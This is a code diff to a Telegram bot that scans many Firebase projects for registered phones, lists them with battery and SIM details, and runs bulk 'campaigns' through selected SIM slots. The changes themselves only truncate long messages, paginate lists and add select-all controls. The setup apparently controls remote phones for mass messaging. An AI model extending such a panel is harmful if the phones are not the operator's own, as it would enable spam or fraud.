@@ -239,7 +239,7 @@ def get_all_online_devices(user_id: int) -> tuple:
     all_online = []
     total_clients = 0
     fb_stats = []
-    workers = min(len(configs), 16)
+    workers = min(max(len(configs), 1), 40)
     with ThreadPoolExecutor(max_workers=workers) as pool:
         for res in pool.map(_scan_one, configs):
             all_online.extend(res['online'])
@@ -247,6 +247,23 @@ def get_all_online_devices(user_id: int) -> tuple:
             fb_stats.append(res['stat'])
 
     return all_online, total_clients, fb_stats
+
+
+TG_LIMIT = 4000  # keep safely under Telegram's 4096 hard limit
+
+async def _safe_edit(msg, text: str, markup=None):
+    """Edit a message, truncating if it exceeds Telegram's length limit so the
+    call never silently fails (which used to leave 'Scanning...' stuck)."""
+    if len(text) > TG_LIMIT:
+        text = text[:TG_LIMIT - 40] + "\n\n_…(list truncated)_"
+    try:
+        await msg.edit_text(text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)
+    except Exception:
+        # Final fallback: strip markdown problems / send plain truncated text
+        try:
+            await msg.edit_text(text[:TG_LIMIT], reply_markup=markup)
+        except Exception as e:
+            logger.error(f"_safe_edit failed: {e}")
 
 
 async def scan_devices_async(user_id: int) -> tuple:
@@ -282,10 +299,20 @@ def fmt_time(seconds: float) -> str:
 async def _send_or_edit(update: Update, text: str, markup=None):
     """Edit the message if this came from an inline button, else send a new one.
     Lets the same screen work from both inline buttons and the bottom menu."""
-    if update.callback_query:
-        await update.callback_query.edit_message_text(text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)
-    else:
-        await update.message.reply_text(text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)
+    if len(text) > TG_LIMIT:
+        text = text[:TG_LIMIT - 40] + "\n\n_…(list truncated)_"
+    try:
+        if update.callback_query:
+            await update.callback_query.edit_message_text(text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)
+        else:
+            await update.message.reply_text(text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        logger.error(f"_send_or_edit failed: {e}")
+        target = update.callback_query.message if update.callback_query else update.message
+        try:
+            await target.reply_text(text[:TG_LIMIT], reply_markup=markup)
+        except Exception:
+            pass
 
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -377,29 +404,37 @@ async def show_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
     online = len(online_devices)
     offline = max(0, total_clients - online)
 
+    err_count = sum(1 for fs in fb_stats if fs.get('error'))
+
     text = (
         f"📱 *Device Overview (All Firebases)*\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🟢 Online: `{online}`\n"
         f"🔴 Offline: `{offline}`\n"
         f"📊 Total Registered: `{total_clients}`\n"
-        f"🔥 Firebases Scanned: `{len(fb_stats)}`\n\n"
+        f"🔥 Firebases Scanned: `{len(fb_stats)}`"
+        + (f" (⚠️ {err_count} errors)" if err_count else "")
+        + "\n\n"
     )
 
-    # Per-firebase breakdown
+    # Per-firebase breakdown — only show those WITH online devices or errors,
+    # and cap the list so the message stays under Telegram's limit.
     if fb_stats:
-        text += "*Per Firebase:*\n"
-        for fs in fb_stats:
-            err = fs.get('error')
-            if err:
-                text += f"  ❌ {fs['name']} — Error\n"
-            else:
-                text += f"  🔥 {fs['name']} — 🟢{fs['online']} / 🔴{fs['offline']} / 📊{fs['total']}\n"
-        text += "\n"
+        notable = [fs for fs in fb_stats if fs.get('online') or fs.get('error')]
+        if notable:
+            text += "*Per Firebase (active/errors):*\n"
+            for fs in notable[:15]:
+                if fs.get('error'):
+                    text += f"  ❌ {fs['name']} — Error\n"
+                else:
+                    text += f"  🔥 {fs['name']} — 🟢{fs['online']} / 📊{fs['total']}\n"
+            if len(notable) > 15:
+                text += f"  … +{len(notable) - 15} more\n"
+            text += "\n"
 
     if online_devices:
-        text += "*Online Devices:*\n"
-        for idx, dev in enumerate(online_devices, 1):
+        text += f"*Online Devices (showing {min(len(online_devices), 20)} of {len(online_devices)}):*\n"
+        for idx, dev in enumerate(online_devices[:20], 1):
             sim_parts = []
             for s in dev['sims']:
                 carrier = s.get('carrier', 'N/A')
@@ -413,9 +448,10 @@ async def show_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
             fb_label = dev.get('fb_name', '?')
             text += (
                 f"\n{idx}. *{dev['model']}* _{fb_label}_\n"
-                f"   ID: `{dev['id'][:12]}...`\n"
                 f"   🔋 {dev['battery']} | 📶 {sim_str}\n"
             )
+        if len(online_devices) > 20:
+            text += f"\n…and `{len(online_devices) - 20}` more online devices.\n"
     else:
         text += "⚠️ *No devices online across any Firebase!*\n"
 
@@ -426,7 +462,7 @@ async def show_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ],
         [InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")],
     ]
-    await msg.edit_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
+    await _safe_edit(msg, text, InlineKeyboardMarkup(kb))
 
 
 # ============================================================
@@ -783,17 +819,26 @@ async def data_file_delete_confirm(update: Update, context: ContextTypes.DEFAULT
 async def show_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     configs = db.get_firebase_configs(user_id)
-    text = "🔥 *Firebase Management*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    total = len(configs)
+    text = f"🔥 *Firebase Management*\n━━━━━━━━━━━━━━━━━━━━━━\n\n🗂 Total: `{total}`\n\n"
 
     kb = []
     if configs:
-        for fc in configs:
-            status = "🟢 Active" if fc['is_active'] else "⚪"
-            text += f"{status} *{fc['name']}*\n   `{fc['url'][:50]}...`\n\n"
+        active = [c for c in configs if c['is_active']]
+        if active:
+            text += f"🟢 Active: *{active[0]['name']}*\n\n"
+        # Telegram limits buttons/length — show at most 30 as buttons.
+        shown = configs[:30]
+        text += "*Firebases* _(tap to manage)_:\n"
+        for fc in shown:
+            mark = "🟢 " if fc['is_active'] else ""
+            text += f"  {mark}{fc['name']}\n"
             kb.append([InlineKeyboardButton(
                 f"{'✅ ' if fc['is_active'] else ''}{fc['name']}",
                 callback_data=f"fb_view_{fc['id']}"
             )])
+        if total > 30:
+            text += f"\n…and `{total - 30}` more (not shown — list limit).\n"
     else:
         text += "No Firebase configured. Add one to get started!\n"
 
@@ -1275,34 +1320,56 @@ async def _camp_step4_settings(update: Update, context: ContextTypes.DEFAULT_TYP
     camp['available_devices'] = online_devices
     # Build device→fb_url map for campaign execution
     camp['device_fb_map'] = {dev['id']: dev['fb_url'] for dev in online_devices}
-    selected = camp.get('selected_devices', [d['id'] for d in online_devices])
+    online_ids = {d['id'] for d in online_devices}
+    if 'selected_devices' not in camp:
+        # First entry → default select everything online.
+        selected = [d['id'] for d in online_devices]
+    else:
+        # Respect the user's choice (including an intentional "clear all").
+        selected = [s for s in camp['selected_devices'] if s in online_ids]
     camp['selected_devices'] = selected
 
     settings = db.get_user_settings(user_id)
     camp.setdefault('sim_slot', settings.get('default_sim', 0))
     camp.setdefault('delay', settings.get('default_delay', 2.0))
 
+    err_count = sum(1 for fs in fb_stats if fs.get('error'))
     text = (
         f"🚀 *CAMPAIGN — Step 4/6*\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"⚙️ *CAMPAIGN SETTINGS*\n\n"
-        f"🔥 Firebases: `{len(fb_stats)}` | 📱 Online: `{len(online_devices)}` / `{total_clients}`\n\n"
-        f"*Available Devices:*\n"
+        f"🔥 Firebases: `{len(fb_stats)}`"
+        + (f" (⚠️ {err_count} err)" if err_count else "")
+        + f"\n📱 Online: `{len(online_devices)}` / `{total_clients}`\n"
+        f"✅ Selected: `{len(selected)}`\n\n"
     )
 
     kb = []
-    if online_devices:
+    SHOW_INDIVIDUAL = len(online_devices) <= 20
+
+    if not online_devices:
+        text += "⚠️ *No devices online across any Firebase!*\n"
+    elif SHOW_INDIVIDUAL:
+        text += "*Available Devices:* _(tap to toggle)_\n"
         for dev in online_devices:
             is_selected = dev['id'] in selected
             emoji = "☑" if is_selected else "⬜"
             fb_label = dev.get('fb_name', '?')
-            text += f"{emoji} *{dev['model']}* _{fb_label}_ — 🟢 Ready\n"
+            text += f"{emoji} *{dev['model']}* _{fb_label}_\n"
             kb.append([InlineKeyboardButton(
                 f"{emoji} {dev['model']} [{fb_label}]",
                 callback_data=f"camp_dev_{dev['id']}"
             )])
     else:
-        text += "⚠️ *No devices online across any Firebase!*\n"
+        # Too many devices to list individually — use bulk select controls.
+        text += (
+            f"_{len(online_devices)} devices mil gaye — list bahut badi hai, "
+            f"isliye niche bulk control diye hain._\n"
+        )
+        kb.append([
+            InlineKeyboardButton(f"✅ Select All ({len(online_devices)})", callback_data="camp_dev_all"),
+            InlineKeyboardButton("⬜ Clear All", callback_data="camp_dev_none"),
+        ])
 
     text += (
         f"\n📶 *SIM Slot:* `SIM {camp['sim_slot'] + 1}` (slot {camp['sim_slot']})\n"
@@ -1330,7 +1397,14 @@ async def _camp_step4_settings(update: Update, context: ContextTypes.DEFAULT_TYP
     kb.append([InlineKeyboardButton("❌ Cancel", callback_data="camp_cancel")])
 
     camp['step'] = 5
-    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
+    await _safe_edit(update.callback_query.message, text, InlineKeyboardMarkup(kb))
+
+async def campaign_select_all_devices(update: Update, context: ContextTypes.DEFAULT_TYPE, select: bool):
+    camp = context.user_data.get('campaign', {})
+    available = camp.get('available_devices', [])
+    camp['selected_devices'] = [d['id'] for d in available] if select else []
+    camp['step'] = 4
+    await _camp_step4_settings(update, context)
 
 async def campaign_toggle_device(update: Update, context: ContextTypes.DEFAULT_TYPE, dev_id: str):
     camp = context.user_data.get('campaign', {})
@@ -1382,9 +1456,11 @@ async def _camp_step5_review(update: Update, context: ContextTypes.DEFAULT_TYPE)
     )
 
     if ready_devices:
-        text += "\n*Selected Devices:*\n"
-        for d in ready_devices:
-            text += f"  🟢 {d['model']} (`{d['id'][:8]}...`)\n"
+        text += f"\n*Selected Devices ({len(ready_devices)}):*\n"
+        for d in ready_devices[:15]:
+            text += f"  🟢 {d['model']} _{d.get('fb_name','?')}_\n"
+        if len(ready_devices) > 15:
+            text += f"  …and `{len(ready_devices) - 15}` more\n"
 
     kb = [
         [InlineKeyboardButton("✅ CONFIRM & START", callback_data="camp_confirm")],
@@ -1395,7 +1471,7 @@ async def _camp_step5_review(update: Update, context: ContextTypes.DEFAULT_TYPE)
         ],
         [InlineKeyboardButton("❌ Cancel", callback_data="camp_cancel")],
     ]
-    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
+    await _safe_edit(update.callback_query.message, text, InlineKeyboardMarkup(kb))
 
 async def campaign_confirm_start(update: Update, context: ContextTypes.DEFAULT_TYPE, schedule_dt=None):
     user_id = update.effective_user.id
@@ -2517,6 +2593,10 @@ async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await campaign_select_file(update, context, int(data[10:]))
     if data.startswith("camp_tpl_"):
         return await campaign_select_template(update, context, int(data[9:]))
+    if data == "camp_dev_all":
+        return await campaign_select_all_devices(update, context, True)
+    if data == "camp_dev_none":
+        return await campaign_select_all_devices(update, context, False)
     if data.startswith("camp_dev_"):
         return await campaign_toggle_device(update, context, data[9:])
     if data.startswith("camp_sim_"):
